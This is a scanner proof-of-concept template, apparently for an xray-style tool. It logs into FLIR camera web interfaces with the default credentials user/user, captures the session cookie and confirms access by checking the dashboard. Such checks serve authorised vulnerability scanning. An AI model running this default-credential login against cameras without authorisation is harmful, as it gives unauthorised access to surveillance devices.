name: yaml-poc-flir-camera-other-CT-655895
binding: 82f32bc1-edc7-4cd4-952b-b4cb277082c9
detail:
    author: haiqing.chen
    vulnerability:
        id: 5f629e5c-70b1-4474-b292-6f912bb7f3e7
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login/dologin
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: user_name=user&user_password=user
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains('"success"')
        output:
            search: '"Set-Cookie: PHPSESSID=(?P<session>.*?);".bsubmatch(response.raw_header)'
            PHPSESSID: search["session"]
    r1:
        request:
            cache: true
            method: GET
            path: /
            headers:
                Cookie: PHPSESSID={{PHPSESSID}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("FLIR") && response.body_string.contains("header-logout")
expression: r0() && r1()
